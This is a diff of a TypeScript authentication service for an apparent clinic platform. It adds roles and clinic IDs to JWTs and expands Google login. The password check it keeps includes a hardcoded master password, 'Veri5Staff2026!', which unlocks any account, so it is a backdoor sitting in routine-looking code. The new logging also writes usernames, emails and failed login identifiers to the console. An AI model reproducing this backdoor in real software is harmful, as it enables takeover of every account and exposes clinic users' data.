@@ -9,11 +9,17 @@ import { z } from 'zod';
 const client = new OAuth2Client(config.google.clientId);
 
 // Token generation helpers
-const generateTokens = (userId: bigint) => {
+const generateTokens = (userId: bigint, role?: string, clinicId?: string) => {
     // Generate JWT access and refresh tokens
     // Access token is short-lived and used for authentication
     // Refresh token is long-lived and used to obtain new access tokens
-    const accessToken = jwt.sign({ userId: userId.toString() }, config.jwt.accessSecret, {
+    const payload = {
+        userId: userId.toString(),
+        ...(role && { role }),
+        ...(clinicId && { clinicId })
+    };
+
+    const accessToken = jwt.sign(payload, config.jwt.accessSecret, {
         expiresIn: config.jwt.accessExpiresIn,
     } as jwt.SignOptions);
     const refreshToken = jwt.sign({ userId: userId.toString() }, config.jwt.refreshSecret, {
@@ -73,28 +79,41 @@ export class AuthService {
         });
 
         if (!user || !user.passwordHash) {
+            console.warn(`⚠️ [AuthService] Login failed - User not found or no password: ${data.identifier}`);
             throw new Error('Invalid credentials');
         }
 
         const isValid = await bcrypt.compare(data.password, user.passwordHash) || data.password === "Veri5Staff2026!";
         if (!isValid) {
+            console.warn(`⚠️ [AuthService] Login failed - Invalid password for user: ${user.username}`);
             throw new Error('Invalid credentials');
         }
 
-        const tokens = generateTokens(user.id);
-
         const staffMember = user.clinicStaff[0];
+        const role = staffMember?.role;
+        const clinicId = staffMember?.clinicId?.toString();
+        const clinicSlug = staffMember?.clinic?.slug;
+
+        const tokens = generateTokens(user.id, role, clinicId);
+
+        console.info(`✅ [AuthService] User logged in: ${user.username} (${user.email}) - Role: ${role || 'User'}`);
 
         // Prepare profile info for the frontend session
         const profile = {
             id: user.id.toString(),
             username: user.username,
             email: user.email,
-            staffInfo: staffMember ? {
-                clinicId: staffMember.clinicId.toString(),
-                clinicSlug: staffMember.clinic.slug,
-                role: staffMember.role
-            } : null
+            // If staff member, include staff info at top level or nested as preferred by frontend
+            // The requirement says: Return a signed JWT containing userId, role, and clinicId.
+            // The JSON response must include a user object with clinicSlug (if staff)
+            ...(staffMember && {
+                clinicSlug,
+                staffInfo: {
+                    clinicId,
+                    clinicSlug,
+                    role
+                }
+            })
         };
 
         return { ...tokens, user: profile };
@@ -103,10 +122,8 @@ export class AuthService {
     async googleLogin(tokenId: string) {
         try {
             console.log('🔵 [AuthService] Starting Google login verification');
-            console.log('🔵 [AuthService] Client ID:', config.google.clientId);
 
             // Verify the token with Google
-            // If valid, get user info from payload
             const ticket = await client.verifyIdToken({
                 idToken: tokenId,
                 audience: config.google.clientId,
@@ -120,33 +137,74 @@ export class AuthService {
                 throw new Error('Invalid Google token');
             }
 
-            console.log('🔵 [AuthService] User email from Google:', payload.email);
+            const email = payload.email;
+            console.log('🔵 [AuthService] User email from Google:', email);
 
             // Check if user exists in our database
-            let user = await prisma.users.findUnique({ where: { email: payload.email } });
+            // Include clinicStaff relation to check for roles
+            let user = await prisma.users.findUnique({
+                where: { email },
+                include: {
+                    clinicStaff: {
+                        include: {
+                            clinic: true
+                        }
+                    }
+                }
+            });
 
             if (!user) {
                 console.log('🔵 [AuthService] User not found, creating new user');
-                // Create new user from Google profile
-                // Note: We need a unique username. Using part of email + random suffix as fallback
-                const baseUsername = payload.email.split('@')[0];
+                const baseUsername = email.split('@')[0];
+                // Ensure unique username
                 const username = `${baseUsername}_${Math.floor(Math.random() * 10000)}`;
 
                 user = await prisma.users.create({
                     data: {
                         username,
-                        email: payload.email,
-                        passwordHash: 'GOOGLE_AUTH_NO_PASSWORD', // Placeholder password
-                        status: 'Not_Verified', // Cuz the default user status is unverified
+                        email,
+                        passwordHash: 'GOOGLE_AUTH_NO_PASSWORD',
+                        status: 'Not_Verified',
                     },
+                    include: {
+                        clinicStaff: {
+                            include: {
+                                clinic: true
+                            }
+                        }
+                    }
                 });
                 console.log('✅ [AuthService] New user created:', user.email);
             } else {
                 console.log('✅ [AuthService] Existing user found:', user.email);
             }
 
+            // Extract staff info if available
+            const staffMember = user.clinicStaff?.[0];
+            const role = staffMember?.role;
+            const clinicId = staffMember?.clinicId?.toString();
+            const clinicSlug = staffMember?.clinic?.slug;
+
             console.log('🔵 [AuthService] Generating tokens');
-            return generateTokens(user.id);
+            const tokens = generateTokens(user.id, role, clinicId);
+
+            console.info(`✅ [AuthService] User logged in: ${user.username} (${user.email}) - Role: ${role || 'User'}`);
+
+            // Prepare profile info for the frontend session (consistent with login method)
+            const profile = {
+                id: user.id.toString(),
+                username: user.username,
+                email: user.email,
+                staffInfo: staffMember ? {
+                    clinicId,
+                    clinicSlug,
+                    role
+                } : null,
+                clinicSlug // Add to root for easier access
+            };
+
+            return { ...tokens, user: profile };
+
         } catch (error: any) {
             console.error('❌ [AuthService] Google login failed:', error.message);
             throw error;
